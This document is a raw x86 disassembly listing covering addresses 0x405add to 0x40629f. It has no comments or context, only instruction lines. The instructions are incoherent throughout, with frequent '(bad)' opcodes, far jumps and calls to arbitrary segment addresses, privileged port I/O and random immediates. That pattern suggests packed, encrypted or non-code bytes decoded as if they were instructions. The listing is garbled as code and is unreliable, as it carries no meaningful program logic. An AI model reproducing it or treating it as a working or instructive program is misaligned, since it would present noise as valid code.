  405add:	adc    al,BYTE PTR [ecx+ebp*8-0x1f5d9e72]
  405ae4:	stos   BYTE PTR es:[edi],al
  405ae5:	sub    al,BYTE PTR [edx+0x62748425]
  405aeb:	aas    
  405aec:	shr    DWORD PTR [ebx],cl
  405aee:	pop    edx
  405aef:	(bad)  
  405af1:	aas    
  405af2:	inc    DWORD PTR ds:0xc8827e1a
  405af8:	fadd   QWORD PTR [edx]
  405afa:	sti    
  405afb:	sbb    DWORD PTR [esi],ebx
  405afd:	nop
  405afe:	cmp    DWORD PTR ds:0xbad24054,ebp
  405b04:	and    al,0xcc
  405b06:	outs   dx,DWORD PTR ds:[esi]
  405b07:	(bad)  
  405b0a:	inc    ecx
  405b0b:	push   eax
  405b0c:	xchg   BYTE PTR [eax],bh
  405b0e:	ins    DWORD PTR es:[edi],dx
  405b0f:	lock xor ch,BYTE PTR [edi-0x35668fbf]
  405b16:	dec    ebx
  405b17:	jmp    0xdbef:0xfb4d5dec
  405b1e:	jge    0x405b24
  405b20:	or     eax,0xbeeac3cd
  405b25:	rol    dl,1
  405b27:	fsubr  st,st(2)
  405b29:	xor    ah,dh
  405b2b:	inc    ebx
  405b2c:	mov    ch,0x14
  405b2e:	pop    eax
  405b2f:	pop    esp
  405b30:	cmovne ecx,DWORD PTR [edi]
  405b33:	xchg   ecx,eax
  405b34:	lea    ecx,[esp+edx*2]
  405b37:	add    bh,ah
  405b39:	inc    esi
  405b3a:	into   
  405b3b:	sbb    eax,0xb311615a
  405b40:	cld    
  405b41:	into   
  405b42:	outs   dx,DWORD PTR ds:[esi]
  405b43:	in     al,0x16
  405b45:	cli    
  405b46:	xchg   ecx,eax
  405b47:	(bad)  
  405b48:	jno    0x405b42
  405b4a:	js     0x405bbd
  405b4c:	loopne 0x405b08
  405b4e:	xor    ch,BYTE PTR [ebx-0x1b]
  405b51:	cmp    DWORD PTR [esi+0x3e],ecx
  405b54:	mov    ah,BYTE PTR [ecx-0x35]
  405b57:	test   DWORD PTR [ecx-0x43],edx
  405b5a:	jbe    0x405b9e
  405b5c:	retf   
  405b5d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  405b5f:	and    DWORD PTR [edx],ebx
  405b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b62:	cs icebp 
  405b64:	aaa    
  405b65:	repnz sahf 
  405b67:	ffreep st(3)
  405b69:	xlat   BYTE PTR ds:[ebx]
  405b6a:	jo     0x405ba7
  405b6c:	pand   mm0,QWORD PTR [edi+0xf32e818]
  405b73:	scas   al,BYTE PTR es:[edi]
  405b74:	(bad)  
  405b75:	aad    0x90
  405b77:	mov    ch,BYTE PTR [esi]
  405b79:	fmul   DWORD PTR [edx-0x192b7065]
  405b7f:	xor    eax,0x1b1834ec
  405b84:	(bad)  
  405b85:	mov    esp,0xecb35384
  405b8a:	jge    0x405c00
  405b8c:	xchg   DWORD PTR [edi*4+0x7271dd20],ecx
  405b93:	mov    WORD PTR [ebx+0x23],?
  405b96:	shl    cl,1
  405b98:	sub    bl,bl
  405b9a:	mov    cl,0x40
  405b9c:	test   al,0x6a
  405b9e:	and    eax,0x1e1ea227
  405ba3:	cdq    
  405ba4:	xor    eax,0x8e067e11
  405ba9:	fmulp  st(0),st
  405bab:	xchg   esp,eax
  405bac:	xchg   eax,ecx
  405bae:	mov    esp,0x5dbaf8fa
  405bb3:	dec    ebx
  405bb4:	pop    es
  405bb5:	inc    edx
  405bb6:	jecxz  0x405bc1
  405bb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405bb9:	or     DWORD PTR [ebp+0x4f],esp
  405bbc:	adc    BYTE PTR [ebx-0x15],bl
  405bbf:	push   esp
  405bc0:	cmp    al,0xd6
  405bc2:	and    eax,0xee4e57b4
  405bc7:	and    BYTE PTR [edx+ebp*2-0x3e],ah
  405bcb:	loop   0x405bca
  405bcd:	mov    esp,0x84626c25
  405bd2:	test   DWORD PTR [eax-0x23caec2a],esi
  405bd8:	lods   al,BYTE PTR ds:[esi]
  405bd9:	nop
  405bda:	pusha  
  405bdb:	aam    0x71
  405bdd:	loop   0x405c5e
  405bdf:	xchg   edi,eax
  405be0:	sub    DWORD PTR [ebp+0x5a28a657],ebx
  405be6:	or     BYTE PTR [ecx-0x49],0x9c
  405bea:	sub    edi,ebx
  405bec:	aam    0xa0
  405bee:	out    dx,eax
  405bef:	add    ebp,DWORD PTR [ebx+0x10]
  405bf2:	add    eax,0x574fe31f
  405bf7:	xchg   BYTE PTR [ecx],ah
  405bf9:	sbb    eax,0x6f3102fe
  405bfe:	adc    DWORD PTR [eax+esi*4-0x4e],0xe47cf1cc
  405c06:	xor    al,0x80
  405c08:	outs   dx,BYTE PTR ds:[esi]
  405c09:	pop    esi
  405c0a:	pop    eax
  405c0b:	xor    ebx,ecx
  405c0d:	cmp    DWORD PTR [esi+edi*4-0x51],ebp
  405c11:	(bad)  
  405c12:	pusha  
  405c13:	push   0x69
  405c15:	push   ebx
  405c16:	cmc    
  405c17:	fdivrp st(5),st
  405c19:	pop    edx
  405c1a:	mov    edx,0xf1694438
  405c1f:	pop    ebx
  405c20:	mov    edi,0x962f3423
  405c25:	inc    esp
  405c26:	push   0xb4194c72
  405c2b:	mov    bh,0x18
  405c2d:	and    al,0xe2
  405c2f:	mov    ebp,0x87b49fac
  405c34:	and    al,0xab
  405c36:	add    eax,0xc2f7f92e
  405c3b:	(bad)
  405c3f:	dec    eax
  405c40:	push   ebp
  405c41:	jle    0x405c8f
  405c43:	ret    0x46ac
  405c46:	or     eax,ebx
  405c48:	pop    eax
  405c49:	fwait
  405c4a:	mov    edi,0xe6b35720
  405c4f:	ins    BYTE PTR es:[edi],dx
  405c50:	sahf   
  405c51:	sbb    bh,dl
  405c53:	jns    0x405c28
  405c55:	lods   al,BYTE PTR ds:[esi]
  405c56:	mov    ah,0x23
  405c58:	cmp    DWORD PTR [esi-0x4665bb7f],edi
  405c5e:	in     al,dx
  405c5f:	call   0xd0b7:0xdf6f5f30
  405c66:	jmp    0x25e5:0xed24e919
  405c6d:	or     edi,esi
  405c6f:	push   0x7d
  405c71:	fiadd  DWORD PTR [ecx+0x12]
  405c74:	add    DWORD PTR [ebp-0x6a849280],0xffffffa8
  405c7b:	neg    BYTE PTR [eax]
  405c7d:	sbb    al,0x4a
  405c7f:	mov    eax,0x3524fbf2
  405c84:	pushf  
  405c85:	push   0x18f166fd
  405c8a:	add    dh,bh
  405c8c:	in     al,dx
  405c8d:	sar    DWORD PTR [ebx+0x3b],cl
  405c90:	jns    0x405ccb
  405c92:	ror    DWORD PTR [edx+eiz*1-0x67],0xdc
  405c97:	mov    cs,WORD PTR [edx+eiz*1-0xd]
  405c9b:	pop    edx
  405c9c:	stc    
  405c9d:	cmp    DWORD PTR [ebx+0x582f9dc6],esp
  405ca3:	jno    0x405caa
  405ca5:	adc    al,0x6d
  405ca7:	mov    ebx,0xf368dd6e
  405cac:	dec    edx
  405cad:	pop    esi
  405cae:	jle    0x405d2d
  405cb0:	adc    esp,0xffffffe3
  405cb3:	lds    eax,FWORD PTR [edi]
  405cb5:	(bad)  
  405cb6:	adc    al,BYTE PTR [edi+ebp*4+0x56]
  405cba:	mov    edi,0xa82d41ba
  405cbf:	xchg   edx,eax
  405cc0:	sbb    eax,ebx
  405cc2:	js     0x405cf2
  405cc4:	shl    DWORD PTR [ebp-0x62],0xf5
  405cc8:	(bad)  
  405cc9:	dec    edx
  405cca:	or     DWORD PTR [esi-0x47],ecx
  405ccd:	inc    ebp
  405cce:	cmp    al,0xfd
  405cd0:	mov    DWORD PTR [esi+0x2cd08d22],esi
  405cd6:	scas   eax,DWORD PTR es:[edi]
  405cd7:	mov    ds:0xef306783,eax
  405cdc:	pop    ebp
  405cdd:	sub    edx,DWORD PTR [edx+0x7f]
  405ce0:	into   
  405ce1:	psadbw mm4,mm0
  405ce4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ce6:	test   eax,0x923e4fbb
  405ceb:	mov    ch,0x7
  405ced:	cld    
  405cee:	push   ss
  405cef:	sub    bl,0x4
  405cf2:	sub    al,0x1b
  405cf4:	mov    eax,0x8ffe3e60
  405cf9:	leave  
  405cfa:	or     al,BYTE PTR [edx+eax*4+0x6c]
  405cfe:	retf   0x9072
  405d01:	mov    DWORD PTR [eax+0x29],edi
  405d04:	div    DWORD PTR [edx+0x7f]
  405d07:	push   ebp
  405d08:	loop   0x405cf7
  405d0a:	stc    
  405d0b:	scas   al,BYTE PTR es:[edi]
  405d0c:	mov    eax,ds:0x3ab90d36
  405d11:	push   eax
  405d12:	sti    
  405d13:	test   cl,al
  405d15:	rcr    BYTE PTR [eax],0x55
  405d18:	pop    eax
  405d19:	btc    DWORD PTR [esi-0x3518a4df],esp
  405d20:	cwde   
  405d21:	sub    DWORD PTR [ebx-0x438affd6],edi
  405d27:	push   cs
  405d28:	(bad)  
  405d29:	retf   
  405d2a:	scas   eax,DWORD PTR es:[edi]
  405d2b:	lsl    esp,WORD PTR [ebp+eax*2-0x19]
  405d30:	pop    esp
  405d31:	js     0x405ced
  405d33:	mov    ds,WORD PTR [eax]
  405d35:	sbb    ebx,esi
  405d37:	and    edi,eax
  405d39:	add    cl,ah
  405d3b:	mov    esp,0x489a0e9f
  405d40:	sti    
  405d41:	sbb    BYTE PTR [ecx],0x5e
  405d44:	call   0x90ddff8c
  405d49:	push   ss
  405d4a:	jmp    0x405d21
  405d4c:	arpl   dx,si
  405d4e:	jae    0x405d09
  405d50:	pushf  
  405d51:	movlps QWORD PTR [edi+0x5551d6eb],xmm1
  405d58:	push   eax
  405d59:	jecxz  0x405cdc
  405d5b:	je     0x405d6d
  405d5d:	sub    ebp,edi
  405d5f:	rcr    dh,1
  405d61:	std    
  405d62:	scas   al,BYTE PTR es:[edi]
  405d63:	inc    edi
  405d64:	push   edx
  405d65:	(bad)  
  405d66:	jecxz  0x405d18
  405d68:	inc    ecx
  405d69:	cs clc 
  405d6b:	ret    
  405d6c:	mov    bh,0x94
  405d6e:	or     al,0xa1
  405d70:	cmp    BYTE PTR [ecx],bh
  405d72:	or     DWORD PTR [edx-0x71496035],ebx
  405d78:	addr16 mov esi,0x8d520b47
  405d7e:	inc    eax
  405d7f:	inc    esp
  405d80:	aaa    
  405d81:	test   BYTE PTR [esi],cl
  405d83:	pop    eax
  405d84:	adc    ah,ah
  405d86:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d88:	mov    eax,0x3f3009a0
  405d8d:	je     0x405d49
  405d8f:	adc    DWORD PTR [eax+edx*8-0x34],eax
  405d93:	or     ebx,DWORD PTR [eax-0x4d]
  405d96:	test   eax,0x23b73871
  405d9b:	loope  0x405dee
  405d9d:	jmp    0x773c3690
  405da2:	test   eax,0xe2041936
  405da7:	(bad)  
  405da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405da9:	cmp    cl,cl
  405dab:	retf   0xdcfa
  405dae:	push   esp
  405daf:	inc    ebp
  405db0:	icebp  
  405db1:	jmp    0x405d92
  405db3:	jae    0x405daf
  405db5:	test   BYTE PTR [ebp+0x20],dl
  405db8:	dec    eax
  405db9:	data16 je 0x405d86
  405dbc:	cmp    eax,0xe6031dcb
  405dc1:	xor    eax,0x40e46c9
  405dc6:	repnz loop 0x405dfb
  405dc9:	jno    0x405d7f
  405dcb:	aad    0xe9
  405dcd:	mov    bl,0xa5
  405dcf:	retf   
  405dd0:	adc    cl,BYTE PTR ds:0x9fc2e5fd
  405dd6:	dec    esi
  405dd7:	push   ds
  405dd8:	and    DWORD PTR ds:0xc45f47b6,0xd7105a5
  405de2:	ds je  0x405e21
  405de5:	and    bh,BYTE PTR [eax-0x3b263337]
  405deb:	xchg   esp,eax
  405dec:	dec    ecx
  405ded:	add    BYTE PTR [ebx-0x7fadaf36],dl
  405df3:	xchg   ebp,eax
  405df4:	push   0x75f12f66
  405df9:	cs add al,0xa2
  405dfc:	and    eax,0xd52536e2
  405e01:	cli    
  405e02:	sub    al,0xf4
  405e04:	adc    ah,bh
  405e06:	sbb    ebp,DWORD PTR [ebx+0x47f8398e]
  405e0c:	(bad)  
  405e0d:	stc    
  405e0e:	lock jae 0x405ded
  405e11:	xor    al,0x88
  405e13:	lods   eax,DWORD PTR ds:[esi]
  405e14:	adc    al,0xf0
  405e16:	adc    ebp,DWORD PTR [edi-0x7dc22571]
  405e1c:	inc    ebp
  405e1d:	jne    0x405dbf
  405e1f:	push   0xbe18641a
  405e24:	ror    DWORD PTR [edi-0x12],0xb8
  405e28:	pop    edi
  405e29:	sbb    DWORD PTR [ebx-0x13],ebx
  405e2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405e2d:	stc    
  405e2e:	into   
  405e2f:	mov    ds:0x2d88276d,eax
  405e34:	jo     0x405e94
  405e36:	ror    BYTE PTR [ecx-0xae747dd],1
  405e3c:	mov    ebp,0x208a50a3
  405e41:	gs jl  0x405dd3
  405e44:	dec    ebp
  405e45:	inc    esi
  405e46:	aad    0xf
  405e48:	leave  
  405e49:	out    dx,al
  405e4a:	or     BYTE PTR [ecx+edi*1+0x718c8ed2],dl
  405e51:	mov    ah,0x68
  405e53:	add    DWORD PTR [edx-0x394b515b],0x89daf2c2
  405e5d:	sbb    al,0x89
  405e5f:	sub    esp,edi
  405e61:	jecxz  0x405e15
  405e63:	jp     0x405df3
  405e65:	loopne 0x405e99
  405e67:	outs   dx,BYTE PTR ds:[esi]
  405e68:	test   eax,0x32c61d92
  405e6d:	jb     0x405dfb
  405e6f:	cmp    al,0x5f
  405e71:	push   cs
  405e72:	fidivr DWORD PTR [ebp+0x10]
  405e75:	push   0x6f
  405e77:	mov    bh,0xbe
  405e79:	test   al,0x67
  405e7b:	(bad)  
  405e7c:	xchg   edi,eax
  405e7d:	pop    esp
  405e7e:	lods   al,BYTE PTR ds:[esi]
  405e7f:	gs pop edi
  405e81:	nop
  405e82:	outs   dx,BYTE PTR cs:[esi]
  405e84:	xchg   ecx,eax
  405e85:	or     al,bh
  405e87:	mov    ds:0x993961f,al
  405e8c:	das    
  405e8d:	sbb    dh,dl
  405e8f:	adc    eax,0x1b7415f2
  405e94:	test   DWORD PTR [ebp-0x3a],esp
  405e97:	mov    dh,0x43
  405e99:	jg     0x405ec5
  405e9b:	dec    BYTE PTR [esi+0x6077a62]
  405ea1:	adc    al,0x2e
  405ea3:	std    
  405ea4:	sbb    al,0x81
  405ea6:	iret   
  405ea7:	or     DWORD PTR [eax+0x0],edx
  405eaa:	jmp    0x405eba
  405eac:	scas   al,BYTE PTR es:[edi]
  405ead:	fld    st(4)
  405eaf:	mov    ds:0x6a1d87b,al
  405eb4:	pushf  
  405eb5:	dec    ebx
  405eb6:	fs xchg ecx,eax
  405eb8:	rcr    bl,1
  405eba:	in     al,0xfd
  405ebc:	fpatan 
  405ebe:	sub    al,0x57
  405ec0:	sbb    eax,0x7f62af5d
  405ec5:	mov    eax,0x167e39e4
  405eca:	jb     0x405f2e
  405ecc:	int    0xe2
  405ece:	lods   eax,DWORD PTR ds:[esi]
  405ecf:	lods   eax,DWORD PTR ds:[esi]
  405ed0:	aad    0x9f
  405ed2:	jae    0x405f34
  405ed4:	push   edx
  405ed5:	ds out 0x5d,eax
  405ed8:	sub    dl,cl
  405eda:	repnz sbb esp,ebx
  405edd:	jle    0x405f0a
  405edf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ee0:	(bad)  
  405ee1:	clc    
  405ee2:	retf   
  405ee3:	mov    esi,0x65f091ba
  405ee8:	frstor [eax-0x62]
  405eeb:	aas    
  405eec:	je     0x405f23
  405eee:	sbb    DWORD PTR [ebp+0x1],0x5e877498
  405ef5:	sub    eax,0x4b060729
  405efa:	in     eax,0xbe
  405efc:	mov    edi,0x338a8e44
  405f01:	pop    eax
  405f02:	sub    eax,0x55d0387e
  405f07:	jns    0x405f4a
  405f09:	rol    BYTE PTR [ebx+0x74cb6236],cl
  405f0f:	popa   
  405f10:	cmc    
  405f11:	cmp    esp,ebx
  405f13:	lahf   
  405f14:	in     eax,dx
  405f15:	inc    esp
  405f16:	cdq    
  405f17:	aas    
  405f18:	push   eax
  405f19:	lods   al,BYTE PTR ds:[esi]
  405f1a:	or     al,0xda
  405f1c:	(bad)  
  405f1d:	fcom   DWORD PTR [edi]
  405f1f:	scas   al,BYTE PTR es:[edi]
  405f20:	and    cl,ch
  405f22:	mov    BYTE PTR ds:0x36ba61a8,dl
  405f28:	xor    al,0x1b
  405f2a:	jle    0x405ee0
  405f2c:	das    
  405f2d:	dec    esp
  405f2e:	rcr    BYTE PTR ss:[ecx+0x11],cl
  405f32:	mov    edi,0x5747d729
  405f37:	inc    ebx
  405f38:	xlat   BYTE PTR ds:[ebx]
  405f39:	mov    DWORD PTR [edx-0x35b7886c],esi
  405f3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f40:	jbe    0x405f8f
  405f42:	rcl    BYTE PTR [esi+0x4da3eaba],cl
  405f48:	inc    ecx
  405f49:	stos   DWORD PTR es:[edi],eax
  405f4a:	out    dx,eax
  405f4b:	jg     0x405f83
  405f4d:	mov    bl,BYTE PTR [edi-0x43a3f3eb]
  405f53:	fwait
  405f54:	scas   eax,DWORD PTR es:[edi]
  405f55:	popa   
  405f56:	lea    esi,[edx+0x607ee5b0]
  405f5c:	or     al,0xca
  405f5e:	and    cl,BYTE PTR [ecx]
  405f60:	aam    0x8e
  405f62:	pushf  
  405f63:	jmp    0xcbd8:0xb555d8b0
  405f6a:	sbb    DWORD PTR [esi-0x3],0xffffffb2
  405f6e:	lea    esp,ds:0x4b113f6a
  405f74:	pop    esi
  405f75:	push   cs
  405f76:	push   ecx
  405f77:	in     al,dx
  405f78:	dec    edi
  405f79:	pushf  
  405f7a:	and    edx,DWORD PTR [esi]
  405f7c:	push   0x2d1efea5
  405f81:	in     al,0x4d
  405f83:	iret   
  405f84:	outs   dx,DWORD PTR ds:[esi]
  405f85:	ins    BYTE PTR es:[edi],dx
  405f86:	jns    0x405f5d
  405f88:	in     al,dx
  405f89:	stos   BYTE PTR es:[edi],al
  405f8a:	mov    eax,ds:0x5dfb519e
  405f8f:	imul   edx,esp,0xce068473
  405f95:	or     BYTE PTR [esp+edi*2-0x20],cl
  405f99:	ret    0x7c31
  405f9c:	loope  0x405f95
  405f9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f9f:	mov    esi,0xe7c6d045
  405fa4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405fa5:	jge    0x405fd7
  405fa7:	dec    ebx
  405fa8:	sub    eax,0x1b4d7e40
  405fad:	ret    
  405fae:	dec    ebx
  405faf:	fisttp DWORD PTR [ebp-0x3d]
  405fb2:	dec    ecx
  405fb3:	inc    edi
  405fb4:	(bad)  
  405fb6:	inc    ebx
  405fb7:	test   al,0x8f
  405fb9:	mov    dl,bh
  405fbb:	mov    ss:0xeaaced94,eax
  405fc1:	mov    edx,0x5a728e9a
  405fc6:	lea    ecx,ds:0xb84a086
  405fcc:	ret    0x4314
  405fcf:	or     BYTE PTR [ebx+0x69],bh
  405fd2:	dec    ecx
  405fd3:	outs   dx,BYTE PTR ds:[esi]
  405fd4:	jns    0x405fec
  405fd6:	dec    esi
  405fd7:	out    0x7c,al
  405fd9:	and    DWORD PTR [ebx+ebx*1],edx
  405fdc:	fisttp WORD PTR [ecx+0x62]
  405fdf:	mov    esi,0x697c1eac
  405fe4:	mov    ebp,0x93fa6f9e
  405fe9:	cmc    
  405fea:	and    ebx,edx
  405fec:	push   0xcbf802f4
  405ff1:	and    BYTE PTR [ebp+0x2e78911e],0x3d
  405ff8:	test   DWORD PTR [esi-0x7],eax
  405ffb:	out    dx,eax
  405ffc:	(bad)  
  405ffd:	or     edi,DWORD PTR ds:0x84854ee2
  406003:	arpl   WORD PTR [eax-0x33],di
  406006:	cld    
  406007:	jecxz  0x406008
  406009:	sbb    DWORD PTR [esi-0x4164f71],ebx
  40600f:	fs xchg cl,al
  406012:	and    al,0xbf
  406014:	inc    edx
  406015:	xchg   esp,eax
  406016:	mov    dh,0xb9
  406018:	lods   al,BYTE PTR ds:[esi]
  406019:	add    DWORD PTR [ebx+0x4c],ebx
  40601c:	es cli 
  40601e:	xor    bl,bl
  406020:	xor    bh,BYTE PTR [ebx-0x2400c07e]
  406026:	scas   eax,DWORD PTR es:[edi]
  406027:	out    dx,al
  406028:	loop   0x406088
  40602a:	mov    ah,BYTE PTR [ebx]
  40602c:	arpl   WORD PTR [ebx],si
  40602e:	ja     0x405fdc
  406030:	cmp    DWORD PTR [edx],0x6bc5ada9
  406036:	push   ebp
  406037:	or     eax,0xc7bcb3bc
  40603c:	pop    ecx
  40603d:	push   0xb69258b0
  406042:	add    al,0xf3
  406044:	popa   
  406045:	jle    0x406079
  406047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406048:	popa   
  406049:	jbe    0x406009
  40604b:	jmp    0x406094
  40604d:	mov    ch,0xbe
  40604f:	call   0x375e36
  406054:	pusha  
  406055:	mov    esp,0xe54f194c
  40605a:	inc    esp
  40605b:	pop    esi
  40605c:	xor    al,0x38
  40605e:	je     0x406075
  406060:	in     eax,dx
  406061:	jmp    0xb2b1:0xd4264e88
  406068:	cmp    DWORD PTR [ebx-0x3b2d76c3],ecx
  40606e:	and    eax,0x3a6e2e54
  406073:	dec    eax
  406074:	(bad)  
  406075:	(bad)  
  406076:	shl    BYTE PTR ds:0xbec264b4,1
  40607c:	popf   
  40607d:	lea    edx,[ecx+ecx*1]
  406080:	daa    
  406081:	loop   0x40605a
  406083:	call   0xa4b4:0x628f73ff
  40608a:	jno    0x4060c2
  40608c:	in     eax,0x72
  40608e:	push   0x436f4290
  406093:	mov    bl,0xc5
  406095:	jns    0x406054
  406097:	jne    0x406089
  406099:	push   0xb6b92137
  40609e:	ret    
  40609f:	lahf   
  4060a0:	(bad)  
  4060a1:	push   0x85ffc33f
  4060a6:	fs inc ecx
  4060a8:	add    BYTE PTR [ebx],bl
  4060aa:	mov    DWORD PTR [ebx+0x19],esi
  4060ad:	stos   DWORD PTR es:[edi],eax
  4060ae:	repnz fistp DWORD PTR [ebp+0x295e7f26]
  4060b5:	enter  0xb938,0x3d
  4060b9:	mov    ds:0x57800cd3,eax
  4060be:	mov    eax,DWORD PTR [eax]
  4060c0:	loopne 0x40605c
  4060c2:	stc    
  4060c3:	xchg   ecx,eax
  4060c4:	jo     0x4060cb
  4060c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060c7:	mov    edx,0xda9b404d
  4060cc:	sbb    bl,BYTE PTR [edx-0x585afcbd]
  4060d2:	adc    eax,0x6400ee11
  4060d7:	sbb    bh,0xeb
  4060da:	and    esp,DWORD PTR [edi-0x62]
  4060dd:	inc    ecx
  4060de:	inc    esp
  4060df:	fwait
  4060e0:	std    
  4060e1:	inc    esp
  4060e2:	pop    es
  4060e3:	pop    ebx
  4060e4:	push   es
  4060e5:	push   eax
  4060e6:	or     DWORD PTR [ecx+0x1c],esi
  4060e9:	out    0x3d,al
  4060eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4060ec:	aaa    
  4060ed:	popa   
  4060ee:	sbb    bl,dl
  4060f0:	scas   al,BYTE PTR es:[edi]
  4060f1:	push   0x79
  4060f3:	std    
  4060f4:	pop    eax
  4060f5:	sub    bh,al
  4060f7:	jae    0x40616c
  4060f9:	test   BYTE PTR [eax+esi*4+0x38],bh
  4060fd:	ret    0xe85
  406100:	adc    cl,BYTE PTR [edx+0x325b7a4a]
  406106:	stos   BYTE PTR es:[edi],al
  406107:	call   0x5a07f72f
  40610c:	jnp    0x40611b
  40610e:	cwde   
  40610f:	mov    dl,0xdc
  406111:	(bad)  
  406112:	cmc    
  406113:	pop    ecx
  406114:	pop    ebx
  406115:	push   edi
  406116:	into   
  406117:	jnp    0x406152
  406119:	imul   esp,DWORD PTR [edx],0xffffffa0
  40611c:	jmp    0xe82c:0xa8c457f6
  406123:	aam    0xac
  406125:	xchg   ebp,eax
  406126:	arpl   si,cx
  406128:	xchg   edx,eax
  406129:	sub    DWORD PTR [ebp-0x4f6932f2],ebp
  40612f:	idiv   DWORD PTR [esi+ebp*1]
  406132:	push   0xa1e4c70e
  406137:	imul   esi,DWORD PTR [edx+eiz*1],0xffffffa0
  40613b:	push   0xffffffcd
  40613d:	and    esi,DWORD PTR [ecx-0x80]
  406140:	pop    sp
  406142:	daa    
  406143:	fdiv   QWORD PTR [esi+edx*2-0x1712f86c]
  40614a:	mov    bl,bl
  40614c:	out    0x9a,eax
  40614e:	(bad)  
  40614f:	ret    
  406150:	jns    0x406165
  406152:	loopne 0x406150
  406154:	in     eax,0x8f
  406156:	and    edi,DWORD PTR [ebp+0x23]
  406159:	mov    dh,ah
  40615b:	jns    0x406184
  40615d:	ja     0x406125
  40615f:	mov    ah,dh
  406161:	repz popf 
  406163:	mov    ebx,0x8ed2d08e
  406168:	mov    eax,ds:0x2970b906
  40616d:	loop   0x406120
  40616f:	int3   
  406170:	out    dx,al
  406171:	sbb    cl,ch
  406173:	dec    edi
  406174:	cmp    DWORD PTR [ebp+0x42daa3c2],ecx
  40617a:	fidivr DWORD PTR [ebp+0x6023b1d6]
  406180:	in     al,dx
  406181:	push   eax
  406182:	adc    bh,dh
  406184:	mov    cl,0x64
  406186:	hlt    
  406187:	ret    0x57fe
  40618a:	fst    st(2)
  40618c:	or     dl,BYTE PTR [esi-0x28]
  40618f:	leave  
  406190:	arpl   WORD PTR [edx],si
  406192:	xor    bl,BYTE PTR [ecx+0x18113051]
  406198:	sub    DWORD PTR ds:0x7edb4595,esi
  40619e:	fstp   QWORD PTR [ebx+0x46]
  4061a1:	sbb    al,0xf0
  4061a3:	jne    0x4061a5
  4061a5:	cmp    BYTE PTR [esi-0x1e751f4d],0x79
  4061ac:	iret   
  4061ad:	add    eax,0x3d0c2f2e
  4061b2:	cmp    al,0x3f
  4061b4:	mov    ecx,0x8becc188
  4061b9:	xor    eax,0xd25dd5f0
  4061be:	sbb    ecx,DWORD PTR [eax+0x51]
  4061c1:	mov    BYTE PTR [eax+0x56],cl
  4061c4:	sahf   
  4061c5:	jmp    0x406177
  4061c7:	inc    eax
  4061c8:	adc    ecx,ebx
  4061ca:	jge    0x406239
  4061cc:	dec    ecx
  4061cd:	jnp    0x406162
  4061cf:	popa   
  4061d0:	inc    edi
  4061d1:	sbb    BYTE PTR [esi],0x3e
  4061d4:	call   0x7182ea00
  4061d9:	pop    edi
  4061da:	inc    edx
  4061db:	pop    es
  4061dc:	inc    ebx
  4061dd:	out    dx,eax
  4061de:	in     al,0xe6
  4061e0:	call   0xba8ddf2
  4061e5:	or     DWORD PTR [eax+edx*2],edx
  4061e8:	ss sbb al,0x66
  4061eb:	xchg   edi,eax
  4061ec:	in     al,dx
  4061ed:	sbb    eax,0x82105d2f
  4061f2:	(bad)  
  4061f3:	push   0xb77b5c7d
  4061f8:	add    eax,0xf2eaeb4b
  4061fd:	(bad)  
  4061fe:	out    0xc7,al
  406200:	lahf   
  406201:	push   esp
  406202:	pop    esp
  406203:	lods   al,BYTE PTR ds:[esi]
  406205:	aam    0x85
  406207:	test   BYTE PTR [ebp-0x97905bf],ch
  40620d:	push   cs
  40620e:	ret    0x4158
  406211:	jp     0x40623a
  406213:	popa   
  406214:	out    0x2d,al
  406216:	sbb    ah,BYTE PTR [esi]
  406218:	mov    edi,DWORD PTR [eax]
  40621a:	and    bl,BYTE PTR [ecx+edx*4]
  40621d:	mov    ch,0x33
  40621f:	inc    edx
  406220:	retf   0x5f97
  406223:	adc    bl,BYTE PTR [ebp+0x52ce501d]
  406229:	ss jb  0x4062a8
  40622c:	xor    BYTE PTR [edx-0x76],al
  40622f:	or     DWORD PTR [edx-0x41],edi
  406232:	cmp    BYTE PTR [ecx+0x50],0x3
  406236:	jae    0x406249
  406238:	not    DWORD PTR gs:[esp+edi*8]
  40623c:	add    bl,al
  40623e:	retf   0x9962
  406241:	cwde   
  406242:	xor    al,0xe7
  406244:	mov    edx,0x706ab9fb
  406249:	outs   dx,BYTE PTR ds:[esi]
  40624a:	sti    
  40624b:	sbb    edi,esp
  40624d:	mov    dh,bl
  40624f:	push   ecx
  406250:	test   al,dl
  406252:	dec    eax
  406253:	cmc    
  406254:	cmp    eax,ebp
  406256:	sub    al,0x67
  406258:	shl    BYTE PTR [ecx],cl
  40625a:	test   ch,ah
  40625c:	xor    al,0xa8
  40625e:	sti    
  40625f:	shr    BYTE PTR [esi],cl
  406261:	mov    ebp,DWORD PTR [edi]
  406263:	(bad)  
  406264:	push   ecx
  406265:	fld    DWORD PTR [ecx+0x3e]
  406268:	ja     0x40621f
  40626a:	inc    edi
  40626b:	call   0x657a:0xd46a1945
  406272:	jbe    0x4062d0
  406274:	in     eax,0xdf
  406276:	sub    al,0x6a
  406278:	ins    BYTE PTR es:[edi],dx
  406279:	add    esp,DWORD PTR [edx]
  40627b:	sti    
  40627c:	jmp    0x40626d
  40627e:	dec    edx
  40627f:	repz xchg edi,eax
  406281:	ret    
  406282:	adc    ah,cl
  406284:	jnp    0x40629c
  406286:	ret    0x379d
  406289:	xchg   ebx,eax
  40628a:	xchg   ebp,eax
  40628b:	or     eax,0x5870192d
  406290:	pushf  
  406291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406292:	iret   
  406293:	repnz int 0x1d
  406296:	cmp    bh,cl
  406298:	jl     0x406229
  40629a:	sbb    al,BYTE PTR [edx-0x1c]
  40629d:	jb     0x4062dd
  40629f:	fldenv [eax-0x7a9d6cb8]
